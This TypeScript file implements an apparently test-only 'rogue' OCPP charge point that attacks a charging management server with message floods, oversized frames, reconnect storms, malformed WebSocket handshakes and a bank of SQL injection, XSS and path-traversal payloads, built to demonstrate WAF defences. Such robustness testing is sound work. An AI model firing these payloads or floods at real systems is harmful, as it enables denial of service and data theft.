import { EventEmitter } from 'node:events';
import WebSocket from 'ws';
import { versionLabel, type FrameKind, type LogEntry, type OcppVersion } from '@sim/ocpp';
import { ATTACKS, HANDSHAKE_ATTACK_IDS, type AttackFlags, type AttackId, type HandshakeAttackId, type RogueConfig, type RogueState } from './types.ts';
import { HANDSHAKE_CASES, buildHandshakeRequest, sendHandshakeProbe } from './handshake.ts';

const HANDSHAKE_SET = new Set<AttackId>(HANDSHAKE_ATTACK_IDS);

const RECONNECT_DELAY_MS = 4000;
const STORM_DELAY_MS = 600;
const MAX_LOGS = 600;

/** Vendor/model strings that make the node obvious on the CSMS dashboard. */
const IDENTITY = {
  vendor: 'ROGUE-TESTNODE',
  model: 'DoNotTrust 666',
  serial: 'RGUE-000666',
  firmware: '0.0.0-evil',
};

const now = () => new Date().toISOString();
let globalSeq = 0;

function blankCounts(): Record<AttackId, number> {
  return Object.fromEntries(ATTACKS.map((a) => [a.id, 0])) as Record<AttackId, number>;
}

const rand = (n: number) => Math.floor(Math.random() * n);
const pick = <T>(xs: T[]): T => xs[rand(xs.length)];

/**
 * A deliberately misbehaving ("rogue" / faulty) OCPP charge point. It connects
 * to a real CSMS and, when armed, exercises the server's robustness with a
 * configurable mix of spec-violating and abusive behaviours.
 *
 * It does NOT use the shared RpcEndpoint on purpose: the whole point is to break
 * the rules that endpoint enforces (one call in flight, valid framing, valid
 * payloads), so it writes raw strings straight onto the socket.
 *
 * Scope: a local testing tool aimed at the user's own CSMS sandbox.
 */
export class RogueCharger extends EventEmitter {
  config: RogueConfig;
  armed: boolean;
  logs: LogEntry[] = [];
  /** The CSMS URL the node was created with — used for "reset to default". */
  readonly defaultCsmsUrl: string;

  private attacks: AttackFlags;
  private ws: WebSocket | null = null;
  private wantConnected = true;
  /** When set, the next close reconnects immediately (used when retargeting). */
  private forceReconnect = false;
  private connState: RogueState['connection'] = {
    state: 'disconnected',
    connectedAt: null,
    socketOpens: 0,
    error: null,
  };

  private timers = new Map<AttackId, NodeJS.Timeout>();
  private reconnectTimer: NodeJS.Timeout | null = null;
  private stormTimer: NodeJS.Timeout | null = null;

  private stats: RogueState['stats'] = {
    framesSent: 0,
    attacksFired: blankCounts(),
    injectionProbes: 0,
    handshakeProbes: 0,
    handshakeBlocked: 0,
    lastAttack: null,
  };


  constructor(config: RogueConfig, attacks: AttackFlags, armed: boolean) {
    super();
    this.config = config;
    this.defaultCsmsUrl = config.csmsUrl;
    this.attacks = attacks;
    this.armed = armed;
  }

  // ------------------------------------------------------------------ lifecycle

  connect() {
    this.wantConnected = true;
    this.openSocket();
  }

  disconnect() {
    this.wantConnected = false;
    if (this.reconnectTimer) clearTimeout(this.reconnectTimer);
    this.reconnectTimer = null;
    this.ws?.close(1000, 'Disconnected from GUI');
  }

  shutdown() {
    this.wantConnected = false;
    this.stopAllTimers();
    if (this.reconnectTimer) clearTimeout(this.reconnectTimer);
    this.ws?.close();
  }

  private openSocket() {
    if (this.ws) return;
    if (this.reconnectTimer) clearTimeout(this.reconnectTimer);
    this.reconnectTimer = null;
    const url = `${this.config.csmsUrl.replace(/\/+$/, '')}/${encodeURIComponent(this.config.chargePointId)}`;
    this.connState = { ...this.connState, state: 'connecting', error: null };
    this.emitState();

    const ws = new WebSocket(url, [this.config.version]);
    this.ws = ws;

    ws.on('open', () => {
      this.connState = {
        ...this.connState,
        state: 'connected',
        connectedAt: Date.now(),
        socketOpens: this.connState.socketOpens + 1,
      };
      this.emitState();
      // Boot once so the CSMS registers us (with obviously-rogue identity),
      // then start whatever attacks are armed.
      this.sendBoot();
      this.rescheduleAttacks();
    });
    ws.on('message', (data) => this.onMessage(data.toString()));
    ws.on('error', (err) => {
      this.connState = { ...this.connState, error: err.message };
    });
    ws.on('close', () => {
      this.ws = null;
      this.stopAllTimers();
      this.connState = { ...this.connState, state: 'disconnected', connectedAt: null };
      this.emitState();
      if (this.wantConnected) {
        const delay = this.forceReconnect ? 0 : this.armed && this.attacks.reconnectStorm ? STORM_DELAY_MS : RECONNECT_DELAY_MS;
        this.forceReconnect = false;
        this.reconnectTimer = setTimeout(() => this.openSocket(), delay);
      }
    });
  }

  // ------------------------------------------------------------------ control

  setArmed(on: boolean) {
    this.armed = on;
    this.rescheduleAttacks();
    this.toast(on ? 'error' : 'info', on ? 'Armed — misbehaving against the CSMS' : 'Disarmed — behaving normally');
    this.emitState();
  }

  toggle(attack: AttackId, on: boolean) {
    this.attacks[attack] = on;
    this.rescheduleAttacks();
    this.emitState();
  }

  setAll(on: boolean) {
    for (const a of ATTACKS) this.attacks[a.id] = on;
    this.rescheduleAttacks();
    this.emitState();
  }

  setIntensity(value: number) {
    this.config.intensity = Math.min(8, Math.max(1, value || 1));
    this.rescheduleAttacks();
    this.emitState();
  }

  /**
   * Point the rogue node at a different CSMS/OCPP WebSocket URL and reconnect
   * there straight away. Rejects anything that isn't a ws:// or wss:// URL.
   */
  setTarget(csmsUrl: string) {
    const next = (csmsUrl ?? '').trim();
    let parsed: URL;
    try {
      parsed = new URL(next);
    } catch {
      this.toast('error', `Invalid target URL: ${next || '(empty)'}`);
      return;
    }
    if (parsed.protocol !== 'ws:' && parsed.protocol !== 'wss:') {
      this.toast('error', `Target must be a ws:// or wss:// URL (got ${parsed.protocol}//)`);
      return;
    }
    if (next === this.config.csmsUrl) {
      this.toast('info', 'Target unchanged');
      return;
    }

    this.config.csmsUrl = next;
    this.toast('info', `Target CSMS → ${next}`);

    if (this.ws) {
      // Drop the live socket; the close handler reconnects immediately (force).
      this.forceReconnect = true;
      this.ws.close(1000, 'Retargeting CSMS');
    } else if (this.wantConnected) {
      // We were mid-backoff with no socket: jump straight to the new target.
      if (this.reconnectTimer) clearTimeout(this.reconnectTimer);
      this.reconnectTimer = null;
      this.openSocket();
    }
    // If the user had manually disconnected, just remember the new target; it
    // takes effect when they press Connect.
    this.emitState();
  }

  /** Fire one instance of an attack right now, regardless of its timer. */
  burst(attack: AttackId) {
    this.runAttack(attack);
  }

  // ------------------------------------------------------------------ scheduling

  private rescheduleAttacks() {
    this.stopAllTimers();
    if (!this.armed || this.connState.state !== 'connected') return;

    for (const meta of ATTACKS) {
      if (!this.attacks[meta.id]) continue;
      if (meta.id === 'reconnectStorm') {
        // Slam the socket shut on a cadence; `close` restarts it fast.
        const period = Math.max(400, meta.everyMs / this.config.intensity);
        this.stormTimer = setInterval(() => this.ws?.close(4000, 'rogue reconnect storm'), period);
        continue;
      }
      const period = Math.max(40, meta.everyMs / this.config.intensity);
      this.timers.set(
        meta.id,
        setInterval(() => this.runAttack(meta.id), period),
      );
    }
  }

  private stopAllTimers() {
    for (const t of this.timers.values()) clearInterval(t);
    this.timers.clear();
    if (this.stormTimer) clearInterval(this.stormTimer);
    this.stormTimer = null;
  }

  // ------------------------------------------------------------------ attacks

  private runAttack(id: AttackId) {
    // Handshake-abuse modes open their own throwaway upgrade request; they do
    // NOT need (or use) the established data socket.
    if (HANDSHAKE_SET.has(id)) return this.runHandshakeProbe(id as HandshakeAttackId);
    if (this.connState.state !== 'connected' || !this.ws) return;
    switch (id) {
      case 'flood':
        return this.attackFlood();
      case 'oversized':
        return this.attackOversized();
      case 'sqlInjection':
        return this.attackInjection('sqlInjection');
      case 'xssPayload':
        return this.attackInjection('xssPayload');
      case 'pathTraversal':
        return this.attackInjection('pathTraversal');
      default:
        return;
    }
  }

  private note(id: AttackId) {
    this.stats.attacksFired[id]++;
    this.stats.lastAttack = { id, at: Date.now() };
  }

  private attackFlood() {
    this.note('flood');
    // A short burst each tick so the overall rate is high.
    for (let i = 0; i < 5; i++) {
      if (Math.random() < 0.5) this.sendCall('Heartbeat', {});
      else this.sendCall('StatusNotification', { connectorId: 1, errorCode: 'NoError', status: 'Available', timestamp: now() });
    }
  }

  private attackOversized() {
    this.note('oversized');
    const blob = 'A'.repeat(300_000);
    this.sendCall('BootNotification', buildBoot(this.config.version, { model: blob }));
  }

  /**
   * Injection-style attacks: well-formed OCPP frames whose string fields carry a
   * SQLi / XSS / path-traversal payload. The framing is valid, so only content
   * inspection stops them — exactly what a WAF's signature engine (and the
   * hardened field patterns in specs/) is for. The payload rides in the fields a
   * CSMS most often looks up or logs: the RFID idTag/idToken and the vendor
   * strings, plus a transaction id in 2.0.1.
   */
  private attackInjection(id: 'sqlInjection' | 'xssPayload' | 'pathTraversal') {
    this.note(id);
    this.stats.injectionProbes++;
    const payload = pick(INJECTION_PAYLOADS[id]);
    // Spread the payload across a few carriers so the probe hits different
    // field validators (strict token fields vs. looser free-text vendor fields).
    const carrier = pick(['authorize', 'boot', 'startTx']);

    if (this.config.version === 'ocpp1.6') {
      if (carrier === 'authorize') {
        this.sendCall('Authorize', { idTag: payload });
      } else if (carrier === 'startTx') {
        this.sendCall('StartTransaction', {
          connectorId: 1,
          idTag: payload,
          meterStart: rand(1000),
          timestamp: now(),
        });
      } else {
        this.sendCall('BootNotification', buildBoot('ocpp1.6', { vendor: payload }));
      }
    } else {
      if (carrier === 'authorize') {
        this.sendCall('Authorize', { idToken: { idToken: payload, type: 'ISO14443' } });
      } else if (carrier === 'startTx') {
        this.sendCall('TransactionEvent', {
          eventType: 'Started',
          timestamp: now(),
          triggerReason: 'Authorized',
          seqNo: rand(5),
          transactionInfo: { transactionId: payload },
          idToken: { idToken: payload, type: 'ISO14443' },
        });
      } else {
        this.sendCall('BootNotification', buildBoot('ocpp2.0.1', { vendor: payload }));
      }
    }
  }

  /**
   * Handshake-abuse probe: open a single malformed WebSocket upgrade to the
   * gateway that breaks `ocpp-csms-gateway.openapi.yaml`, and report whether the
   * gateway rejected it. This is the layer FortiWeb's OpenAPI validation covers,
   * so with the WAF in front the probe comes back blocked; without it the
   * permissive CSMS usually answers 101 (accepted), which we flag loudly.
   */
  private runHandshakeProbe(id: HandshakeAttackId) {
    this.note(id);
    this.stats.handshakeProbes++;
    const target = { csmsUrl: this.config.csmsUrl, chargePointId: this.config.chargePointId, version: this.config.version };
    const kase = pick(HANDSHAKE_CASES[id]);
    const req = buildHandshakeRequest(target, kase);
    this.pushLog({
      dir: 'out',
      kind: 'CALL',
      messageId: kase.variant,
      action: `WS handshake ✗ ${kase.why}`,
      payload: { variant: kase.variant, why: kase.why, subprotocol: req.subprotocol },
      raw: `→ ${req.requestLine}  [Sec-WebSocket-Protocol: ${req.subprotocol ?? '(none)'}]`,
    });
    sendHandshakeProbe(target, kase, (res) => {
      const blocked = !res.accepted;
      if (blocked) this.stats.handshakeBlocked++;
      this.pushLog({
        dir: 'in',
        kind: blocked ? 'CALLERROR' : 'CALLRESULT',
        messageId: kase.variant,
        action: blocked
          ? `gateway blocked handshake (${res.status ?? res.error ?? 'no response'})`
          : `gateway ACCEPTED handshake (${res.status}) — WAF not in front!`,
        payload: res,
        raw: JSON.stringify(res),
        errorCode: blocked ? String(res.status ?? 'NO_RESPONSE') : undefined,
        errorDescription: blocked ? kase.why : undefined,
      });
      this.emitState();
    });
  }

  // ------------------------------------------------------------------ incoming

  private onMessage(raw: string) {
    const frame = safeParse(raw);
    const isCommand = Array.isArray(frame) && frame[0] === 2 && typeof frame[1] === 'string';
    const isError = Array.isArray(frame) && frame[0] === 4;
    this.pushLog({
      dir: 'in',
      kind: guessKind(raw),
      messageId: Array.isArray(frame) && typeof frame[1] === 'string' ? frame[1] : '?',
      // Surface the CSMS's rejection reason so it shows up in the inspector.
      action: isCommand ? `CSMS: ${frame[2]}` : isError ? 'CSMS rejected' : 'CSMS→rogue',
      payload: frame,
      raw,
      errorCode: isError ? String(frame[2] ?? '') : undefined,
      errorDescription: isError ? String(frame[3] ?? '') : undefined,
    });
    // We don't match CSMS responses back to our requests, so CALLRESULT/CALLERROR
    // frames are simply dropped here.
    if (!isCommand) return;
    // The CSMS has sent us a CALL (Reset, RemoteStart, TriggerMessage, …). Reply
    // with a bare empty CALLRESULT so the node looks half-alive without actually
    // doing what was asked.
    this.sendRaw(JSON.stringify([3, frame[1], {}]), { kind: 'CALLRESULT', action: String(frame[2] ?? '?'), messageId: frame[1] });
  }

  // ------------------------------------------------------------------ sending

  private id() {
    return `${Date.now().toString(36)}-${(globalSeq++).toString(36)}`;
  }

  private sendBoot() {
    this.sendCall('BootNotification', buildBoot(this.config.version, {}));
    if (this.config.version === 'ocpp1.6') {
      this.sendCall('StatusNotification', { connectorId: 0, errorCode: 'NoError', status: 'Available', timestamp: now() });
    }
  }

  private sendCall(action: string, payload: Record<string, unknown>) {
    const id = this.id();
    this.sendRaw(JSON.stringify([2, id, action, payload]), { kind: 'CALL', action, messageId: id, payload });
  }

  private sendRaw(raw: string, meta: { kind: FrameKind; action: string; messageId?: string; payload?: unknown }) {
    const ws = this.ws;
    if (!ws || ws.readyState !== WebSocket.OPEN) return;
    try {
      ws.send(raw);
    } catch {
      return;
    }
    this.stats.framesSent++;
    this.pushLog({ dir: 'out', kind: meta.kind, messageId: meta.messageId ?? '?', action: meta.action, payload: meta.payload ?? safeParse(raw), raw });
  }

  // ------------------------------------------------------------------ state / logs

  state(): RogueState {
    return {
      config: this.config,
      defaultCsmsUrl: this.defaultCsmsUrl,
      connection: this.connState,
      armed: this.armed,
      attacks: this.attacks,
      stats: this.stats,
    };
  }

  private emitState() {
    this.emit('state', this.state());
  }

  private toast(level: 'info' | 'error' | 'success', text: string) {
    this.emit('toast', { level, text });
  }

  private pushLog(e: {
    dir: 'in' | 'out';
    kind: FrameKind;
    messageId: string;
    action: string;
    payload: unknown;
    raw: string;
    errorCode?: string;
    errorDescription?: string;
  }) {
    const entry: LogEntry = {
      ...e,
      // Keep the biggest raw frames from bloating the GUI/log buffer.
      raw: e.raw.length > 2000 ? e.raw.slice(0, 2000) + `…(+${e.raw.length - 2000} bytes)` : e.raw,
      seq: ++globalSeq,
      ts: Date.now(),
      version: this.config.version,
      peer: this.config.chargePointId,
    };
    this.logs.push(entry);
    if (this.logs.length > MAX_LOGS) this.logs.shift();
    this.emit('log', entry);
  }
}

// ---------------------------------------------------------------------- helpers

function buildBoot(version: OcppVersion, over: { model?: string; vendor?: string }): Record<string, unknown> {
  if (version === 'ocpp1.6') {
    return {
      chargePointVendor: over.vendor ?? IDENTITY.vendor,
      chargePointModel: over.model ?? IDENTITY.model,
      chargePointSerialNumber: IDENTITY.serial,
      firmwareVersion: IDENTITY.firmware,
    };
  }
  return {
    reason: 'PowerUp',
    chargingStation: {
      vendorName: over.vendor ?? IDENTITY.vendor,
      model: over.model ?? IDENTITY.model,
      serialNumber: IDENTITY.serial,
      firmwareVersion: IDENTITY.firmware,
    },
  };
}

/**
 * Injection payload bank. A deliberate mix of two kinds, so a demo shows both
 * layers of a WAF deployment catching it:
 *  - payloads with spaces or over the field length limit — rejected outright by
 *    the hardened field patterns/maxLength in specs/ (schema validation), and
 *  - compact, pattern-legal payloads (no spaces, short) that slip past schema
 *    validation and are caught by the attack-signature engine (SQLi/XSS/traversal
 *    signatures) instead.
 */
const INJECTION_PAYLOADS: Record<'sqlInjection' | 'xssPayload' | 'pathTraversal', string[]> = {
  sqlInjection: [
    "' OR '1'='1' --", // space → schema pattern blocks it in token fields
    "'; DROP TABLE charging_sessions;--", // space + length → schema blocks
    "1' UNION SELECT username,password FROM users--", // space + length → schema blocks
    "admin'--", // compact, no space → signature engine territory
    "RFID'||pg_sleep(5)||'", // compact, no space → signature engine territory
    "1;WAITFOR DELAY '0:0:5'--", // signature engine territory
  ],
  xssPayload: [
    '<script>alert(document.cookie)</script>', // length → schema blocks
    '<img src=x onerror=alert(1)>', // space + length → schema blocks
    '"><svg onload=alert(1)>', // space → schema blocks
    '<svg/onload=alert(1)>', // compact, no space → signature engine
    'javascript:alert(1)', // compact, no space → signature engine
    '<img/src/onerror=alert`1`>', // compact, no space → signature engine
  ],
  pathTraversal: [
    '../../../../etc/passwd', // length → schema blocks in 20-char token fields
    '/var/run/../../etc/shadow', // length → schema blocks
    '..\\..\\..\\windows\\win.ini', // length → schema blocks
    '..%2f..%2fetc', // compact, no space → signature engine
    '....//....//', // compact, no space → signature engine
    '%2e%2e%2fboot', // compact, no space → signature engine
  ],
};

function safeParse(raw: string): unknown {
  try {
    return JSON.parse(raw);
  } catch {
    return raw;
  }
}

function guessKind(raw: string): FrameKind {
  const f = safeParse(raw);
  if (Array.isArray(f)) {
    if (f[0] === 2) return 'CALL';
    if (f[0] === 3) return 'CALLRESULT';
    if (f[0] === 4) return 'CALLERROR';
  }
  return 'CALL';
}

export { ATTACKS, versionLabel };
